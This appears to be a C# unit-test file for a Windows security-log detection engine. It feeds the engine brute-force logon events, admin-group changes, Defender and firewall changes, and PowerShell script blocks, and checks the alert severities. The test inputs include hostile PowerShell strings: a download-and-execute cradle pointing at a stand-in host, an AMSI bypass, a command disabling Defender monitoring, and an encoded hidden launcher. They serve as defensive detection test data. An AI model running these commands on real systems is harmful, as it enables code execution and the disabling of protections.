using NexusIsland.Core.Security;

namespace NexusIsland.Core.Tests;

public class SecurityRulesTests
{
    private static readonly DateTimeOffset T0 = new(2026, 11, 18, 3, 12, 0, TimeSpan.Zero);

    private static SecurityEvent Ev(string log, int id, int seconds, params (string, string)[] data) =>
        new(log, id, T0.AddSeconds(seconds), data.ToDictionary(d => d.Item1, d => d.Item2));

    private static SecurityEvent Failed(int s, string ip, string user = "administrador") =>
        Ev(SecurityLogs.Security, 4625, s, ("TargetUserName", user), ("IpAddress", ip), ("Status", "0xc000006d"), ("LogonType", "3"));

    [Fact]
    public void BruteForce_NeedsTenFailuresInTwoMinutes()
    {
        var rules = new SecurityRules();
        for (var i = 0; i < 9; i++) Assert.Null(rules.Process(Failed(i * 5, "185.220.101.47")));
        var alert = rules.Process(Failed(50, "185.220.101.47", "backup"));
        Assert.NotNull(alert);
        Assert.Equal("brute-force", alert.RuleId);
        Assert.Equal(AlertSeverity.Warning, alert.Severity);
        Assert.Equal("T1110", alert.Mitre);
        Assert.Contains("185.220.101.47", alert.Detail);
        Assert.Contains("backup", alert.Evidence);
    }

    [Fact]
    public void SlowFailures_AreNotBruteForce()
    {
        var rules = new SecurityRules();
        for (var i = 0; i < 20; i++) Assert.Null(rules.Process(Failed(i * 20, "10.0.0.5"))); // 1 cada 20 s: 6 por ventana
    }

    [Fact]
    public void BruteForce_AlertsOnceThenCoolsDown()
    {
        var rules = new SecurityRules();
        var alerts = Enumerable.Range(0, 60).Select(i => rules.Process(Failed(i, "185.220.101.47"))).Count(a => a is not null);
        Assert.Equal(1, alerts);
    }

    [Fact]
    public void SuccessAfterBruteForce_IsCritical_OnlyFromSameSource()
    {
        var rules = new SecurityRules();
        for (var i = 0; i < 12; i++) rules.Process(Failed(i, "185.220.101.47"));
        Assert.Null(rules.Process(Ev(SecurityLogs.Security, 4624, 100, ("TargetUserName", "juan"), ("IpAddress", "10.0.0.9"), ("LogonType", "3"))));
        var alert = rules.Process(Ev(SecurityLogs.Security, 4624, 400, ("TargetUserName", "backup"), ("IpAddress", "185.220.101.47"), ("LogonType", "3")));
        Assert.NotNull(alert);
        Assert.Equal(AlertSeverity.Critical, alert.Severity);
        Assert.Contains("backup", alert.Detail);
    }

    [Fact]
    public void AdminGroup_OnlyAdministrators()
    {
        var rules = new SecurityRules();
        Assert.Null(rules.Process(Ev(SecurityLogs.Security, 4732, 0, ("TargetSid", "S-1-5-32-555"), ("MemberName", "x"))));
        var alert = rules.Process(Ev(SecurityLogs.Security, 4732, 1, ("TargetSid", "S-1-5-32-544"), ("MemberName", "CN=hacker"), ("SubjectUserName", "admin")));
        Assert.Equal(AlertSeverity.Critical, alert!.Severity);
        Assert.Equal("T1098", alert.Mitre);
    }

    [Theory]
    [InlineData("\"C:\\Program Files\\WindowsApps\\Claude_6.6395.0.0_x64__pzs8sxrjxfjjc\\app\\resources\\cowork-svc.exe\"", AlertSeverity.Info)]
    [InlineData("\"C:\\Program Files (x86)\\Vendor\\svc.exe\"", AlertSeverity.Warning)]
    [InlineData("%COMSPEC% /b /c start /b /min powershell -nop -w hidden -enc AAAA", AlertSeverity.Critical)]
    [InlineData("C:\\Users\\Public\\svchost.exe", AlertSeverity.Critical)]
    public void Services_ByPath(string path, AlertSeverity expected) =>
        Assert.Equal(expected, new SecurityRules().Process(Ev(SecurityLogs.System, 7045, 0, ("ServiceName", "svc"), ("ImagePath", path)))!.Severity);

    [Fact]
    public void Tasks_IgnoreWindows_AndLowerUpdaters()
    {
        var rules = new SecurityRules();
        Assert.Null(rules.Process(Ev(SecurityLogs.TaskScheduler, 106, 0, ("TaskName", "\\Microsoft\\Windows\\EnterpriseMgmt\\SessionRetry\\X"))));
        Assert.Equal(AlertSeverity.Info, rules.Process(Ev(SecurityLogs.TaskScheduler, 106, 1, ("TaskName", "\\GoogleUpdaterTaskSystem141.0"))) !.Severity);
        Assert.Equal(AlertSeverity.Warning, rules.Process(Ev(SecurityLogs.TaskScheduler, 106, 2, ("TaskName", "\\Actualizador"), ("UserContext", "PC\\juan")))!.Severity);
    }

    [Fact]
    public void Defender_ExclusionYes_OtherConfigNo()
    {
        var rules = new SecurityRules();
        Assert.Null(rules.Process(Ev(SecurityLogs.Defender, 5007, 0, ("New Value", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration\\ToastOrSsoTrayIcon = 0x1"))));
        var alert = rules.Process(Ev(SecurityLogs.Defender, 5007, 1, ("New Value", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Temp = 0x0")));
        Assert.Equal("defender-exclusion", alert!.RuleId);
        Assert.Contains("C:\\Temp", alert.Detail);
        Assert.Equal(AlertSeverity.Critical, rules.Process(Ev(SecurityLogs.Defender, 1116, 2, ("Threat Name", "Trojan:Win32/X"), ("Path", "C:\\x.exe")))!.Severity);
        Assert.Equal(AlertSeverity.Critical, rules.Process(Ev(SecurityLogs.Defender, 5001, 3))!.Severity);
    }

    [Fact]
    public void Firewall_OnlyWhenTurnedOff()
    {
        var rules = new SecurityRules();
        Assert.Null(rules.Process(Ev(SecurityLogs.Firewall, 2082, 0, ("Profiles", "4"), ("SettingType", "1"), ("SettingValue", "01000000"))));
        Assert.Null(rules.Process(Ev(SecurityLogs.Firewall, 2082, 1, ("Profiles", "4"), ("SettingType", "2"), ("SettingValue", "00000000"))));
        var alert = rules.Process(Ev(SecurityLogs.Firewall, 2082, 2, ("Profiles", "6"), ("SettingType", "1"), ("SettingValue", "00000000")));
        Assert.Equal(AlertSeverity.Critical, alert!.Severity);
    }

    [Theory]
    [InlineData("try { $PSDefaultParameterValues['Out-File:Encoding'] = 'utf8' } catch {}", null)] // lo que corre la app de Claude: normal
    [InlineData("Get-ChildItem C:\\ | Sort-Object Length", null)]
    [InlineData("IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')", AlertSeverity.Critical)]
    [InlineData("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", AlertSeverity.Critical)]
    [InlineData("Set-MpPreference -DisableRealtimeMonitoring $true", AlertSeverity.Critical)]
    [InlineData("$s=[Convert]::FromBase64String($b); iex ([Text.Encoding]::UTF8.GetString($s))", AlertSeverity.Warning)]
    public void PowerShell_OnlyAttackCombinations(string script, AlertSeverity? expected) =>
        Assert.Equal(expected, PowerShellSignals.Analyze(script).Severity);

    [Fact]
    public void PowerShell_MultipartScriptBlock_EvaluatedOncePerPart()
    {
        var rules = new SecurityRules();
        var e = Ev(SecurityLogs.PowerShell, 4104, 0, ("ScriptBlockId", "abc"), ("MessageNumber", "1"), ("ScriptBlockText", "IEX (New-Object Net.WebClient).DownloadString('x')"));
        Assert.NotNull(rules.Process(e));
        Assert.Null(rules.Process(e with { Time = T0.AddHours(1) })); // el mismo evento repetido no vuelve a alertar
    }

    [Fact]
    public void PowerShell_SamePatternInTwoBlocks_AlertsOnce()
    {
        // Pasó en la prueba real: Windows registró el mismo script en dos bloques distintos.
        var rules = new SecurityRules();
        var text = "Write-Output 'Invoke-WebRequest + Invoke-Expression'";
        Assert.NotNull(rules.Process(Ev(SecurityLogs.PowerShell, 4104, 0, ("ScriptBlockId", "a"), ("MessageNumber", "1"), ("ScriptBlockText", text))));
        Assert.Null(rules.Process(Ev(SecurityLogs.PowerShell, 4104, 1, ("ScriptBlockId", "b"), ("MessageNumber", "1"), ("ScriptBlockText", text))));
    }
}
